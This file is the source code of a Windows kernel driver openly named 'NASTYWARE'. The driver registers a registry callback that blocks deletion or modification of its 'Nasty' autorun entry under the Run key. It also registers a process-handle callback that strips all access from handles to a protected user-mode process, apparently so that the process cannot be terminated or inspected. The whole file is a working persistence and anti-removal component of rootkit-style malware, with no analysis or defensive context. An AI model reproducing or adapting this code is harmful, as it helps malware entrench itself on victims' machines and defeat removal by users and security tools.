#include <ntddk.h>

#define DRIVER_NAME L"NASTYWARE"
#define DRIVER_REGISTRY_AUTORUN_KEY_NAME L"Nasty"
#define DRIVER_AUTORUN_KEY L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"


#define PROCESS_TERMINATE 1
#define PROCESS_VM_OPERATION 0x0008
#define PROCESS_VM_READ 0x0010
#define PROCESS_VM_WRITE 0x0020
#define PROCESS_SUSPEND_RESUME 0x0800
#define PROCESS_CREATE_THREAD 0x0002

typedef struct {
	LARGE_INTEGER RegistryCookie;
	PVOID ProcessHookHandle;
	ULONG ProcessId;
} GLOBALS, *PGLOBALS;

GLOBALS g_Globals;


// -------------------------------------------------------------
//							DRIVER UNLOAD
// -------------------------------------------------------------
void DriverUnload(PDRIVER_OBJECT DriverObject) {
	UNREFERENCED_PARAMETER(DriverObject);
	CmUnRegisterCallback(g_Globals.RegistryCookie);
	ObUnRegisterCallbacks(g_Globals.ProcessHookHandle);
	KdPrint(("Driver : Unloaded.\n"));
}


// -------------------------------------------------------------
//							REGISTRY PROTECTION
// -------------------------------------------------------------
bool ProtectedKey(PVOID Object, PUNICODE_STRING ValueName) {
	PCUNICODE_STRING FullRegistryPath;
	NTSTATUS status = CmCallbackGetKeyObjectIDEx(&g_Globals.RegistryCookie, Object, nullptr, &FullRegistryPath, 0);
	UNICODE_STRING PersistenceKey = RTL_CONSTANT_STRING(DRIVER_AUTORUN_KEY);
	UNICODE_STRING PersistenceKeyName = RTL_CONSTANT_STRING(DRIVER_REGISTRY_AUTORUN_KEY_NAME);
	bool retBool = false;
	if (NT_SUCCESS(status)) {
		if (wcsstr(FullRegistryPath->Buffer, PersistenceKey.Buffer) != nullptr &&
			RtlCompareUnicodeString(ValueName, &PersistenceKeyName, TRUE) == 0) {
			retBool = true;
		}
		CmCallbackReleaseKeyObjectIDEx(FullRegistryPath);
	}
	return retBool;
}
NTSTATUS OnRegistryNotify(PVOID Context, PVOID Argument1, PVOID Argument2) {
	UNREFERENCED_PARAMETER(Context);

	REG_NOTIFY_CLASS Operation = (REG_NOTIFY_CLASS)(ULONG_PTR)Argument1;
	NTSTATUS retStatus = STATUS_SUCCESS;
	
	switch (Operation) {
		case RegNtPreDeleteValueKey: {
			PREG_DELETE_VALUE_KEY_INFORMATION RegDeleteInfo = (PREG_DELETE_VALUE_KEY_INFORMATION)Argument2;
			if (ProtectedKey(RegDeleteInfo->Object, RegDeleteInfo->ValueName)) {
				retStatus = STATUS_ACCESS_DENIED;
			}
			break;
		}

		case RegNtPreSetValueKey: {
			PREG_SET_VALUE_KEY_INFORMATION RegSetInfo = (PREG_SET_VALUE_KEY_INFORMATION)Argument2;
			if (ProtectedKey(RegSetInfo->Object, RegSetInfo->ValueName)) {
				retStatus = STATUS_ACCESS_DENIED;
			}
			break;
		}
		
	}
	return retStatus;
}


// -------------------------------------------------------------
//							PROCESS PROTECTION				   
// -------------------------------------------------------------
OB_PREOP_CALLBACK_STATUS ProcessProtect(PVOID RegistrationContext, POB_PRE_OPERATION_INFORMATION OperationInformation) {
	UNREFERENCED_PARAMETER(RegistrationContext);
	if (OperationInformation->KernelHandle)
		return OB_PREOP_SUCCESS;
	if (g_Globals.ProcessId != 0L) {
		ULONG ProcessId = HandleToUlong(PsGetProcessId((PEPROCESS)OperationInformation->Object));
		if (ProcessId == g_Globals.ProcessId) {
			OperationInformation->Parameters->CreateHandleInformation.DesiredAccess = 0UL;
		}
	}
	return OB_PREOP_SUCCESS;
}



// -------------------------------------------------------------
//							DRIVER ENTRY
// -------------------------------------------------------------
extern "C"
NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) {

	UNREFERENCED_PARAMETER(RegistryPath);
	NTSTATUS retStatus = STATUS_SUCCESS;

	// OUR USER-MODE PROCESS ID
	g_Globals.ProcessId = 0L;
	g_Globals.ProcessHookHandle = nullptr;

	bool RegistryNotify = false;
	bool ProcessNotify = false;

	do {
		UNICODE_STRING Altitude = RTL_CONSTANT_STRING(L"7657.124");

		// Enable registry protection on our key
		retStatus = CmRegisterCallbackEx(OnRegistryNotify, &Altitude, DriverObject, nullptr, &g_Globals.RegistryCookie, nullptr);
		if (!NT_SUCCESS(retStatus)) {
			KdPrint(("Driver : failed registering registry callback.\n"));
			break;
		}

		RegistryNotify = true;
		


		// Enable process protection in our user-mode process
		OB_OPERATION_REGISTRATION OperationRegistration[1];
		OperationRegistration[0].ObjectType = PsProcessType;
		OperationRegistration[0].Operations = OB_OPERATION_HANDLE_CREATE | OB_OPERATION_HANDLE_DUPLICATE;
		OperationRegistration[0].PreOperation = ProcessProtect;
		OperationRegistration[0].PostOperation = nullptr;

		OB_CALLBACK_REGISTRATION CallbackRegistration;
		CallbackRegistration.Version = OB_FLT_REGISTRATION_VERSION;
		CallbackRegistration.OperationRegistrationCount = 1;
		CallbackRegistration.Altitude = Altitude;
		CallbackRegistration.OperationRegistration = OperationRegistration;
		CallbackRegistration.RegistrationContext = nullptr;

		retStatus = ObRegisterCallbacks(&CallbackRegistration, &g_Globals.ProcessHookHandle);
		if (!NT_SUCCESS(retStatus)) {
			KdPrint(("Driver : Error while protecting process"));
			break;
		}

		ProcessNotify = true;
	} while (false);

	if (!NT_SUCCESS(retStatus)) {
		if (ProcessNotify)
			ObUnRegisterCallbacks(g_Globals.ProcessHookHandle);
		if (RegistryNotify)
			CmUnRegisterCallback(g_Globals.RegistryCookie);
		return retStatus;
	}

	// DRIVER I/O ROUTINES
	DriverObject->DriverUnload = DriverUnload;


	return retStatus;

}